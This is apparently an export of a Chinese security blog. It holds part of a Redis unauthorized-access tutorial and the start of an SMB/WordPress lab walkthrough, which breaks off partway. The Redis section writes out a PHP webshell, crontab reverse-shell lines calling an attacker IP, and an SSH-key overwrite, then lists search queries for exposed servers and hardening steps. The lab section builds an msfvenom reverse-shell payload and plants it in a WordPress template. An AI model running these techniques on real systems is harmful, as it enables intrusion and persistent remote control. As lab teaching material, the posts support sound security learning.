<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534824841-bc85185e-0e45-4132-a3d2-7016685d2789.png" alt="img"></p>
<p>启动Redis服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-server /etc/redis/redis.conf</span><br><span class="line">ps aux | grep redis</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534875556-83e31c01-aeab-4bf5-8ace-ac073de1e78f.png" alt="img"></p>
<p>客户端连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">auth [username] password</span><br><span class="line">或者直接</span><br><span class="line">redis-cli -h [ip] -a [password]</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534917431-167c357b-ef11-4d3d-9e29-d20dd13053c6.png" alt="img"></p>
<h1 id="五、常见命令"><a href="#五、常见命令" class="headerlink" title="五、常见命令"></a>五、常见命令</h1><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>info</td>
<td>查看信息</td>
</tr>
<tr>
<td>flushall</td>
<td>删除所有数据库内容</td>
</tr>
<tr>
<td>flushdb</td>
<td>刷新数据库</td>
</tr>
<tr>
<td>KEYS *</td>
<td>查看所有键,使用 select num 可以查看键值数据</td>
</tr>
<tr>
<td>set test “who am i”</td>
<td>设置变量</td>
</tr>
<tr>
<td>config set dir dirpath</td>
<td>设置路径等配置</td>
</tr>
<tr>
<td>save</td>
<td>保存</td>
</tr>
<tr>
<td>get 变量</td>
<td>查看变量名称</td>
</tr>
</tbody></table>
<h1 id="六、相关漏洞"><a href="#六、相关漏洞" class="headerlink" title="六、相关漏洞"></a>六、相关漏洞</h1><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下：</p>
<h2 id="1、Redis-远程代码执行漏洞-CVE-2016-8339"><a href="#1、Redis-远程代码执行漏洞-CVE-2016-8339" class="headerlink" title="1、Redis 远程代码执行漏洞(CVE-2016-8339)"></a>1、Redis 远程代码执行漏洞(CVE-2016-8339)</h2><p>Redis 3.2.x &lt; 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。</p>
<h2 id="2、CVE-2015-8080"><a href="#2、CVE-2015-8080" class="headerlink" title="2、CVE-2015-8080"></a>2、CVE-2015-8080</h2><p>Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。</p>
<h2 id="3、CVE-2015-4335"><a href="#3、CVE-2015-4335" class="headerlink" title="3、CVE-2015-4335"></a>3、CVE-2015-4335</h2><p>Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码</p>
<h2 id="4、CVE-2013-7458"><a href="#4、CVE-2013-7458" class="headerlink" title="4、CVE-2013-7458"></a>4、CVE-2013-7458</h2><p>读取“.rediscli_history”配置文件信息</p>
<h1 id="七、Redis写文件"><a href="#七、Redis写文件" class="headerlink" title="七、Redis写文件"></a>七、Redis写文件</h1><h2 id="1、写入Webshell"><a href="#1、写入Webshell" class="headerlink" title="1、写入Webshell"></a>1、写入Webshell</h2><p>只要知道 web 绝对路径并且权限足够就可以写个 webshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.117:6379&gt; CONFIG SET dir /usr/share/apache/htdocs/ <span class="comment">#这里是站点绝对路径（我这里Ubuntu没有安装中间件，只作为演示参考）</span></span><br><span class="line">OK </span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> shell <span class="string">&quot;&lt;?php echo system(<span class="variable">$_REQUEST</span>[cmd]);?&gt;&quot;</span> </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; CONFIG SET dbfilename shell.php </span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save <span class="comment">#将内存中的数据保存到dbfilename中 </span></span><br><span class="line"> OK </span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530453148-e673de16-03dc-4211-b71f-9ad842a59906.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645530470665-f9018596-b83f-469c-a38c-09651108c387.png" alt="img"></p>
<blockquote>
<p>MISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk。  如果报错无法向磁盘写入rdb，尝试将stop-writes-on-bgsave-error设置为no，如config set stop-writes-on-bgsave-error no</p>
</blockquote>
<h2 id="2、计划任务启动反弹shell"><a href="#2、计划任务启动反弹shell" class="headerlink" title="2、计划任务启动反弹shell"></a>2、计划任务启动反弹shell</h2><p>在 linux 系的系统有着定时任务的功能，只要文件可以写到定时任务目录里就可以执行系统命令。</p>
<h3 id="（1）命令初测试"><a href="#（1）命令初测试" class="headerlink" title="（1）命令初测试"></a>（1）命令初测试</h3><p>Kali开启nc监听</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531451395-8a360574-8b61-4bc4-bbea-098cd32fe7b0.png" alt="img"></p>
<p>Ubuntu执行命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.236.129/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>​    此时成功反弹shell到nc</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645531530323-6564fd8b-523f-46d9-bcd7-c074baeda827.png" alt="img"></p>
<p>命令是没有问题的</p>
<h3 id="（2）-var-spool-cron-用户名-测试"><a href="#（2）-var-spool-cron-用户名-测试" class="headerlink" title="（2）/var/spool/cron/用户名 测试"></a>（2）/var/spool/cron/用户名 测试</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.1.117:6379&gt; ping</span><br><span class="line">PONG</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dir /var/spool/cron/  //每个用户生成的crontab文件，都会放在 /var/spool/cron/ 目录下面</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; <span class="built_in">set</span> haha <span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  // 直接往当前用户的crontab里写入反弹shell，换行是必不可少的。每分钟尝试连接</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; config <span class="built_in">set</span> dbfilename root</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">(error) ERR</span><br><span class="line">192.168.1.117:6379&gt; get haha</span><br><span class="line"><span class="string">&quot;\n\n\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.1.105/9999 0&gt;&amp;1\n\n\n&quot;</span>  </span><br><span class="line">192.168.1.117:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">192.168.1.117:6379&gt;</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532616785-1f47522e-0b64-4c8f-8768-798ad99d8977.png" alt="img"></p>
<p>之所以会保存错误是因为当前用户对该文件夹没有写权限，为了实验效果修改再次保存即可</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532582590-7a51a137-3341-4dc5-a28c-35622c9d36c0.png" alt="img"></p>
<p>这里也引起反思，实战中碰到这样的问题该怎么办？</p>
<p>检验无错误</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533012313-aedd704a-2881-43a3-a36a-0564a0ba0e43.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645532983058-cf53ff39-f824-40af-a114-9cfd4aa32c9c.png" alt="img"></p>
<p>cron计划任务服务也已经开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl status cron</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534167034-3fe5ceed-8b96-43eb-b589-9527609f34b4.png" alt="img"></p>
<p>但此时nc却迟迟未收到反弹shell</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533096098-b918280f-7837-40d6-aa1a-c7d7ee0760b6.png" alt="img"></p>
<blockquote>
<p>注意：有些系统对 crontab 的文件内容的校验比较严格可能会导致无法执行定时任务。</p>
</blockquote>
<p>按照一个前辈的说法就是Ubuntu的计划任务，前面有乱码它将无法执行。而如果换成CentOs就可以，因为CentOs可以跳过乱码，执行正确的能执行的计划任务代码。这里因为我未部署CentOs虚拟机，就当作我反弹成功了，后续有机会再补上CentOs</p>
<p>一个师傅总结的一些定时计划目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/用户名</span><br><span class="line">/var/spool/cron/crontabs/用户名</span><br><span class="line">/etc/crontab</span><br><span class="line">/etc/cron.d/xxx </span><br></pre></td></tr></table></figure>

<p>​    看了上面才知道，原来当初设置数据库名字为root是对root用户，而这里我的用户名是xdd，因此重新设置一下</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533697421-eb433a13-9485-4c56-9765-63505bfbc1c0.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533684356-a1429aaf-62e7-4618-b608-d359bfd07511.png" alt="img"></p>
<p>nc依然没有收到shell，嗯！这样实验才有说服力，的确是Ubuntu的问题</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533741177-16cb4334-0fbe-4577-8d11-782d03a2637d.png" alt="img"></p>
<h3 id="（3）开发不常用计划任务"><a href="#（3）开发不常用计划任务" class="headerlink" title="（3）开发不常用计划任务"></a>（3）开发不常用计划任务</h3><p>根据一个师傅的说法，如果尝试以上面这种方法写bash反弹，会导致<strong>覆盖原来有的crontab计划任务</strong>，因此极其不推荐直接写到/var/spool/cron，一旦运维在crontab中配置了一些脚本启动，盲目的覆盖，会对业务产生极大的破坏</p>
<p>正确的做法是：选择一个开发不常用的计划任务</p>
<p>以centos7为例子</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533897495-a3c1fda7-25ca-4ff0-811f-7c7975af01eb.png" alt="img"></p>
<p>对应的含义如下：每天/每日/每小时/每月/每周</p>
<p>可以写文件到/etc/cron.hourly/</p>
<p>可以覆盖0anacron文件 or 创建一个可执行的sh文件</p>
<p>覆盖0anacron，正常情况下，没人会在这里写计划任务，可以覆盖它：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645533975584-749ba4a5-eca8-4ee5-88c7-3384487bdf16.png" alt="img"></p>
<p>创建可执行sh文件，如下所示：</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645534034964-c9d1d86a-7bd8-40c5-81fc-d50bb65749fb.png" alt="img"></p>
<p>这样就不会覆盖文件，比较保险</p>
<h2 id="3、写SSH-key"><a href="#3、写SSH-key" class="headerlink" title="3、写SSH key"></a>3、写SSH key</h2><h3 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h3><ol>
<li>Redis 服务器运行在 root 用户下（否则还要猜测用户）</li>
<li>此服务器对外开启了 ssh 服务</li>
<li>Redis 未授权访问漏洞</li>
</ol>
<p>Linux 系统使用 ssh 的用户目录下都会有一个隐藏文件夹<code>/.ssh/</code>。比如我这里用户是</p>
<p>只要把我们的公钥写在对方的 <code>.ssh/authorized_keys</code> 文件里再去用 ssh 连接就不需服务器的账号密码了</p>
<p>开始实验！</p>
<p>由于我Ubuntu的xdd用户目录下没有.ssh文件，那就自己创建一下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535849507-85fa6746-3615-4ef4-9ad0-1db92522247b.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645535875282-40eae062-5cf6-4a4e-89fc-8e4eee5e5474.png" alt="img"></p>
<p>Kali的id_rsa.pub，这是Kali的公钥</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536756860-e59d965f-b838-4dc5-8092-ecc8c3c566c3.png" alt="img"></p>
<p>将公钥信息写入到key.txt中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>;cat id_rsa.pub;<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645536881544-41f26278-d3dd-43f3-a787-f00d7c3a1311.png" alt="img"></p>
<p>将xxx键的值设置为key.txt的内容</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cat key.txt | redis-cli -h 192.168.1.117 -a haha123 -x <span class="built_in">set</span> xxx</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537347164-c16bbd0e-632a-44e6-a598-c4803d6d1a28.png" alt="img"></p>
<p>将攻击者的公钥文件覆盖写入到用户的authorized_keys中</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /home/xdd/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537508508-95f3f6e2-1f7c-4c42-aa69-2864ae884eed.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537491467-aef26890-cd79-49e1-8dd7-a50e9e9849ea.png" alt="img"></p>
<blockquote>
<p>如果本来就有authorized_keys文件，那么将会被新的覆盖</p>
</blockquote>
<p>​    此时用户那边有我们攻击者的公钥文件，攻击者就可以使用私钥免密ssh登录到用户的主机上</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -i /home/kali/.ssh/id_rsa xdd@192.168.1.117</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1645537871357-2968ef4e-bf32-40e0-bdb1-bd6a53717f1a.png" alt="img"></p>
<h1 id="八、Redis攻击思路"><a href="#八、Redis攻击思路" class="headerlink" title="八、Redis攻击思路"></a>八、Redis攻击思路</h1><p><strong>（1）内网端口扫描</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v -n -Pn -p 6379 -sV --scriptredis-info 192.168.56.1/24</span><br></pre></td></tr></table></figure>

<p><strong>（2）通过文件包含读取配置文件</strong></p>
<p><strong>（3）Redis配置文件中一般会设置明文密码，在进行渗透哦时可以通过webshell查看其配置文件，Redis往往不止一台计算机，可以利用其来进行内网渗透，或者扩展权限渗透</strong></p>
<p><strong>（4）使用Redis暴力破解工具</strong></p>
<p><a href="https://github.com/evilpacket/redis-sha-crack%EF%BC%8C%E5%85%B6%E5%91%BD%E4%BB%A4%E4%B8%BA%EF%BC%9A">https://github.com/evilpacket/redis-sha-crack，其命令为：</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">node ./redis-sha-crack.js -w wordlist.txt -s shalist.txt 127.0.0.1 host2.example.com:5555</span><br></pre></td></tr></table></figure>

<p>需要安装node：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/nodejs/node.git </span><br><span class="line">chmod -R 755 node</span><br><span class="line"><span class="built_in">cd</span> node</span><br><span class="line">./configure</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<p><strong>（5）msf下利用模块</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxiliary/scanner/redis/file_upload    normal     Redis File Upload</span><br><span class="line">auxiliary/scanner/redis/redis_login    normal     Redis Login Utility</span><br><span class="line">auxiliary/scanner/redis/redis_server   normal     Redis Command Execute Scanner</span><br></pre></td></tr></table></figure>

<h1 id="九、Redis漏洞挖掘"><a href="#九、Redis漏洞挖掘" class="headerlink" title="九、Redis漏洞挖掘"></a>九、Redis漏洞挖掘</h1><ol>
<li>对“<code>port: 6379</code>”进行搜索：<a href="https://www.zoomeye.org/searchResult?q=port:6379">https://www.zoomeye.org/searchResult?q=port:6379</a></li>
<li>除去显示“<code>-NOAUTH Authentication required.</code>”的结果，显示这个信息表示需要进行认证，也即需要密码才能访问。</li>
<li><a href="https://fofa.so/">https://fofa.so/</a> 关键字检索：<code>port=&quot;6379&quot; &amp;&amp; protocol==redis &amp;&amp; country=CN</code></li>
</ol>
<h1 id="十、Redis基本安全策略"><a href="#十、Redis基本安全策略" class="headerlink" title="十、Redis基本安全策略"></a>十、Redis基本安全策略</h1><ol>
<li>端口修改为其他端口（默认为6379）</li>
<li>requirepass设置复杂的密码</li>
<li>最好不要用Root用户去启动Redis，而是单独为Redis设置一个账号</li>
<li>设置本地localhost不允许外部访问，这样就不能让攻击者去爆破Redis的连接密码</li>
<li>开启保护模式protected-mode（默认开启）</li>
<li>检测Key，通过本地登录，通过“<code>keys *</code>”命令查看，如果有入侵则其中会有很多的值</li>
<li>linux下需要检查<code>authorized_keys</code>：Redis内建了名为crackit的key，也可以是其它值，同时Redis的conf文件中dir参数指向了/root/.ssh，/root/.ssh/authorized_keys 被覆盖或者包含Redis相关的内容，查看其值就可以直到是否被入侵过</li>
<li>检查authorized_keys是否非法，如果已经被修改，则可以重新生成并恢复，不能使用修改过的文件。并重启ssh服务（service ssh restart）</li>
<li>对网站进行webshell扫描和分析：发现利用Redis账号漏洞的，则在shell中会存在Redis字样。</li>
<li>修改conf文件禁止全网访问，打开6379.conf文件，找到bind0.0.0.0前面加上# （禁止全网访问）</li>
</ol>
<p>【可参考加固修改命令】</p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>port</td>
<td>修改redis使用的默认端口</td>
</tr>
<tr>
<td>bind</td>
<td>设定redis监听的专用IP</td>
</tr>
<tr>
<td>requirepass</td>
<td>设定redis连接的密码</td>
</tr>
<tr>
<td>rename-command CONFIG “”</td>
<td>禁用CONFIG命令</td>
</tr>
<tr>
<td>rename-command info info2</td>
<td>重命名info为info2</td>
</tr>
</tbody></table>
<h1 id="十一、参考链接"><a href="#十一、参考链接" class="headerlink" title="十一、参考链接"></a>十一、参考链接</h1><ul>
<li><a href="https://paper.seebug.org/1169/">https://paper.seebug.org/1169/</a></li>
<li><a href="https://www.cnblogs.com/piaomiaohongchen/p/15892170.html">https://www.cnblogs.com/piaomiaohongchen/p/15892170.html</a></li>
<li><a href="https://www.freebuf.com/column/170710.html">https://www.freebuf.com/column/170710.html</a></li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>SMB信息泄露</title>
    <url>/post/6e6874d7.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w">https://pan.baidu.com/s/1xfKILyIzELi_ZgUw4aXT7w</a> 提取码: 59g0</p>
<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，疯狂按shift，进入如下界面后，按e</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639040734696-cfe90231-2c22-4de5-a5b7-8b55960019b9.png" alt="img"></p>
<p>&emsp;&emsp;找到linux开头的行，在最后输入 init=/bin/bash，输入完成后按<strong>Crtl+X</strong></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639040734734-d7a0895d-2140-4a1e-8b3b-29848d2113de.png" alt="img"></p>
<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
<p>&emsp;&emsp;<code>passwd root</code>，输入新密码两次</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1639040734748-2f91dd58-bd12-49c7-af74-7342f371b400.png" alt="img"></p>
<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213315122.png" alt="image-20211209213315122"></p>
<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用arp-scan或者netdiscover</p>
<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213356263.png" alt="image-20211209213356263"></p>
<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209213701557.png" alt="image-20211209213701557"></p>
<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209214141466.png" alt="image-20211209214141466"></p>
<p>&emsp;&emsp;可以看到开放了SMB、Mysql、SSH服务</p>
<h1 id="三、漏洞探测与利用"><a href="#三、漏洞探测与利用" class="headerlink" title="三、漏洞探测与利用"></a>三、漏洞探测与利用</h1><h2 id="1、针对SMB协议弱点检测"><a href="#1、针对SMB协议弱点检测" class="headerlink" title="1、针对SMB协议弱点检测"></a>1、针对SMB协议弱点检测</h2><p>&emsp;&emsp;因为这节主要针对的是smb协议，所以对其进行一波探测<br>&emsp;&emsp;首先，使用空口令: <code>smbclient -L IP</code>，列出该ip所分享的文件和链接。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209214430599.png" alt="image-20211209214430599"></p>
<blockquote>
<p>Print 是 共享驱动 ， 就是共享打印机 </p>
<p>Share 是共享文件夹<br>IPC$ 是共享空连接，不需要用户名就能登陆的web服务器</p>
</blockquote>
<p>&emsp;&emsp;查看print里面的东西（没有权限）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\print$&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209214941328.png" alt="image-20211209214941328"></p>
<p>&emsp;&emsp;查看share共享文件夹里的东西</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">smbclient <span class="string">&#x27;\\IP\share$&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215010614.png" alt="image-20211209215010614"></p>
<p>&emsp;&emsp;get+文件名，可以下载获得文件信息</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215149689.png" alt="image-20211209215149689"></p>
<p>&emsp;&emsp;打开新的终端，打开文件：发现写着密码为12345</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215242375.png" alt="image-20211209215242375"></p>
<p>&emsp;&emsp;相同的方法下载todolist.txt下来看看</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215330173.png" alt="image-20211209215330173"></p>
<p>&emsp;&emsp;接下来打开wordpress看看，主要看配置文件</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215530723.png" alt="image-20211209215530723"></p>
<p>&emsp;&emsp;可以从前面看到该服务器开放了mysql 3306端口，尝试直接连接数据库，但是失败了，应该是设置了只能从本地连接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.1.107 -uroot -pTogieMYSQL12345^^</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209215826411.png" alt="image-20211209215826411"></p>
<p>&emsp;&emsp;因为开放了22端口，尝试使用ssh协议远程登录，但显示密码不对</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh Admin@192.168.1.107</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220036225.png" alt="image-20211209220036225"></p>
<p>&emsp;&emsp;针对smb协议，查看是否存在远程溢出漏洞进行分析</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit samba版本号</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220226503.png" alt="image-20211209220226503"></p>
<p>&emsp;&emsp;没有任何漏洞可以利用</p>
<h2 id="2、针对HTTP协议弱点探测"><a href="#2、针对HTTP协议弱点探测" class="headerlink" title="2、针对HTTP协议弱点探测"></a>2、针对HTTP协议弱点探测</h2><h3 id="（1）目录扫描"><a href="#（1）目录扫描" class="headerlink" title="（1）目录扫描"></a>（1）目录扫描</h3><p>&emsp;&emsp;发现wrodpress的wp-login.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107</span><br></pre></td></tr></table></figure>

<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209220716008.png" alt="image-20211209220716008"></p>
<p>&emsp;&emsp;打开网页看看</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209221510525.png" alt="image-20211209221510525"></p>
<p>&emsp;&emsp;输入前面的wp-config.php中的账号和密码，成功进入</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209222113703.png" alt="image-20211209222113703"></p>
<h3 id="（2）构造payload获取shell"><a href="#（2）构造payload获取shell" class="headerlink" title="（2）构造payload获取shell"></a>（2）构造payload获取shell</h3><p>&emsp;&emsp;使用msfvenom构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.106 lport=4444 -f raw &gt; shell.php</span><br></pre></td></tr></table></figure>

<p>&emsp;&emsp;打开msfconsole，开启监听</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209222737298.png" alt="image-20211209222737298"></p>
<h3 id="（3）在wordpress中上传webshell"><a href="#（3）在wordpress中上传webshell" class="headerlink" title="（3）在wordpress中上传webshell"></a>（3）在wordpress中上传webshell</h3><p>&emsp;&emsp;将shell.php的内容粘贴到 wordpress中的Appearance中，Editor中的404页面</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223113046.png" alt="image-20211209223113046"></p>
<p>&emsp;&emsp;点击update file</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/image-20211209223145775.png" alt="image-20211209223145775"></p>
